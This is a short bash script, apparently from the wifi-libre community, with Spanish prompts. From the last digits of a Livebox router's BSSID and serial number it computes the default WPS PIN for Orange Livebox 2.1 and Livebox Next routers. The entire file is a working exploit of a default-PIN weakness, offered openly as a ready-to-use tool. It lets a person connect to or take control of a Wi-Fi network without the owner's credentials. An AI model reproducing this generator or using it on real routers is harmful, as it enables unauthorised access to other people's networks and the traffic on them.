#! /bin/bash
version=1.2
# orangen.sh: Default pin generator for livebox 2.1 and livebox next
# Algorithm and vulnerability by wifi-libre. For more details check https://www.wifi-libre.com/topic-869-todo-sobre-al-algoritmo-wps-livebox-arcadyan-orange-xxxx.html
# This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation; either version 3 of the License, or (at your option) any later version.
# This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
# You should have received a copy of the GNU General Public License along with this program; if not, write to the Free Software Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301  USA
# Contact script author: kcdtv@wifi-libre.com
# Copyleft (C) 2017 kcdtv @ www.wifi-libre.com
grey="\033[0;37m"
orange="\033[38;5;202m"
white="\033[1;37m"
echo -e "
$orange  orangen$white.sh$grey: A simple bash PIN generator for$orange livebox 2.1$grey and$white Lievbox Next$grey

--------------------------------------------------------------------------------
"
until  [[ "$(echo $bssid | tr A-F a-f | egrep -o '^[0-9a-f]{4}' | wc -c)" == 5 ]];
  do
   echo -e "▐█ Entra los$white 4 últimos digítos$grey del$white bSSID$grey (sin los :) $orange"
   read -n 4 -ep "    " bssid
   echo -e "$grey"  
done
wan=$(printf "%04x" $(( 0x$bssid - 2 )))
until  [[ "$(echo $serial | egrep -o '^[0-9]{4}' | wc -c)" == 5 ]];
  do
   echo -e  "▐█ Entra los$white 4 últimos digítos$grey del$white número de serie$orange"
   read -n 4 -ep "    " serial
   echo -e "$grey"  
done
K1=$(printf "%X\n" $(($(( 0x${serial:0:1} + 0x${serial:1:1} + 0x${wan:2:1} + 0x${wan:3:1}))%16)))
K2=$(printf "%X\n" $(($(( 0x${serial:2:1} + 0x${serial:3:1} + 0x${wan:0:1} + 0x${wan:1:1}))%16)))
D1=$(printf "%X\n" $(($(( 0x$K1 ^ 0x${serial:3:1}))%16)))
D2=$(printf "%X\n" $(($(( 0x$K1 ^ 0x${serial:2:1}))%16))) 
D3=$(printf "%X\n" $(($(( 0x$K2 ^ 0x${wan:1:1}))%16)))
D4=$(printf "%X\n" $(($(( 0x$K2 ^ 0x${wan:2:1}))%16)))
D5=$(printf "%X\n" $(($(( 0x${serial:3:1} ^ 0x${wan:2:1}))%16)))
D6=$(printf "%X\n" $(($(( 0x${serial:2:1} ^ 0x${wan:3:1}))%16)))
D7=$(printf "%X\n" $(($(( 0x$K1 ^ 0x${serial:1:1}))%16)))
pin=$(printf '%07d\n' $(($(printf '%d\n' 0x$D1$D2$D3$D4$D5$D6$D7)%10000000)))
checksum=$((10 - $(($((${pin:0:1} * 3 + ${pin:1:1} + ${pin:2:1} * 3 + ${pin:3:1} + ${pin:4:1} * 3 + ${pin:5:1} + ${pin:6:1} * 3))%10))%10))
echo -e " $white     PIN por defecto: $orange $pin$checksum"
echo -e "$grey
Copyleft (C) 2017 kcdtv @ www.wifi-libre.com"
